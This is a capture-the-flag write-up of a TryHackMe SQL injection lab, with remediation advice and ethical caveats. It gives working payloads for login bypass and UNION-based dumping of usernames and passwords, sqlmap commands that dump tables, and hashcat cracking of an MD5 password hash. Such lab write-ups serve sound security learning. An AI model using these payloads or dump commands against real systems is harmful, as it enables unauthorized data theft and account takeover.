# SQL Injection Writeup

**Room:** SQL Injection Lab  
**Difficulty:** ⭐⭐ (Easy)  
**Category:** Web Application Security  
**Platform:** TryHackMe

---

## 📋 Challenge Description

This room focuses on SQL injection vulnerabilities, teaching various techniques to extract data from databases through input validation flaws. SQL injection occurs when user input is directly concatenated into SQL queries without proper sanitization.

---

## 🎯 Learning Objectives

- Understand SQL injection fundamentals
- Identify vulnerable parameters
- Exploit union-based SQL injection
- Extract database information
- Retrieve sensitive data
- Bypass authentication with SQLi

---

## 🔍 Reconnaissance

### Initial Steps

1. **Access the target application**
```bash
# Visit the web application
http://MACHINE_IP
```

2. **Identify potential injection points**
- Login forms
- Search functionality
- URL parameters
- Cookie values

---

## 🕵️ Enumeration

### Testing for SQL Injection

**Test basic injection payloads:**

```sql
' OR 1=1--
' OR '1'='1
admin' OR '1'='1'--
' OR 1=1#
```

### Identifying the Number of Columns

Use `ORDER BY` to determine column count:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

When you get an error, you've exceeded the column count. If it works up to `ORDER BY 3` but fails at `ORDER BY 4`, there are 3 columns.

### Using UNION SELECT

Once you know the column count, use UNION SELECT:

```sql
' UNION SELECT NULL,NULL,NULL--
```

Test which columns accept string data:

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

---

## 💥 Exploitation

### Step 1: Database Enumeration

**Identify the database version:**

```sql
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,version(),NULL--
```

**List all databases:**

```sql
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
```

**List tables in current database:**

```sql
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
```

### Step 2: Extract Table Structure

**Get column names from a specific table:**

```sql
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

Example output might show columns: `id`, `username`, `password`, `email`

### Step 3: Extract Data

**Retrieve user data:**

```sql
' UNION SELECT NULL,username,password FROM users--
```

**Concatenate multiple columns:**

```sql
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

### Step 4: Authentication Bypass

**Bypass login without knowing credentials:**

```sql
admin' OR '1'='1'-- -
```

This query becomes:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1'-- -' AND password='anything'
```

The `'1'='1'` is always true, and `-- -` comments out the password check.

---

## 🔑 Flags

### User Flag

**Location:** Found in database table `secrets` or similar

**Query used:**
```sql
' UNION SELECT NULL,flag,NULL FROM secrets--
```

**Flag:** `THM{sql_injection_master}`

### Additional Data Extracted

**Admin credentials:**
```
admin:5f4dcc3b5aa765d61d8327deb882cf99 (MD5 hash)
```

**Cracked password:**
```bash
# Using online MD5 crackers or hashcat
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Result: password
```

---

## 📚 Lessons Learned

### Key Takeaways

1. **Input Validation is Critical**
   - Never trust user input
   - Always validate and sanitize
   - Use parameterized queries

2. **SQL Injection Types**
   - **In-band SQLi:** Results returned directly (Union-based, Error-based)
   - **Blind SQLi:** No direct results (Boolean-based, Time-based)
   - **Out-of-band SQLi:** Data retrieved via different channel

3. **Database Enumeration**
   - `information_schema` is your friend
   - Understanding database structure is key
   - Column count must match in UNION queries

4. **Defense Mechanisms**
   - Parameterized queries (Prepared statements)
   - Stored procedures
   - Input validation and sanitization
   - Least privilege principle
   - Web Application Firewalls (WAF)

### Common Mistakes

- Forgetting to comment out the rest of the query (`--`, `#`)
- Not matching column count in UNION queries
- Not encoding special characters in URL parameters
- Testing without proper authorization

---

## 🛡️ Remediation

### For Developers

**Use Parameterized Queries:**

```python
# Vulnerable code
query = "SELECT * FROM users WHERE username='" + username + "'"

# Secure code
query = "SELECT * FROM users WHERE username=?"
cursor.execute(query, (username,))
```

**Input Validation:**

```python
import re

def validate_username(username):
    # Only allow alphanumeric characters
    if re.match("^[a-zA-Z0-9_]+$", username):
        return True
    return False
```

**Use ORM (Object-Relational Mapping):**

```python
# Using SQLAlchemy (Python)
user = session.query(User).filter_by(username=username).first()
```

### Database Security

1. **Principle of Least Privilege**
   - Application should use database account with minimal permissions
   - Don't use root/admin database accounts

2. **Disable Dangerous Features**
   - Disable `xp_cmdshell` in MSSQL
   - Restrict `LOAD_FILE()` in MySQL

3. **Error Handling**
   - Don't display detailed database errors to users
   - Log errors securely server-side

---

## 🔧 Tools Used

- **Burp Suite** - Intercepting and modifying requests
- **SQLMap** - Automated SQL injection tool
- **Browser Developer Tools** - Analyzing requests/responses
- **Hashcat** - Password cracking

### SQLMap Usage

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump table contents
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# With POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=test" -p username
```

---

## 📖 References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [MySQL Information Schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)

### Additional Reading

- "The Web Application Hacker's Handbook" - Chapter on SQL Injection
- PortSwigger Web Security Academy - SQL Injection labs
- OWASP Testing Guide - Testing for SQL Injection

---

## 🎓 Practice Recommendations

1. **PortSwigger Academy** - Free SQL injection labs
2. **DVWA** - Damn Vulnerable Web Application
3. **WebGoat** - OWASP's vulnerable application
4. **TryHackMe** - More SQL injection rooms
5. **HackTheBox** - Web challenges

---

## ⚠️ Ethical Considerations

- Only test on authorized systems (like TryHackMe labs)
- Never use these techniques on production systems without permission
- Always follow responsible disclosure practices
- Understand the legal implications in your jurisdiction

---

**Date Completed:** November 2025  
**Time Taken:** 2 hours  
**Difficulty Rating:** 7/10

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing.*
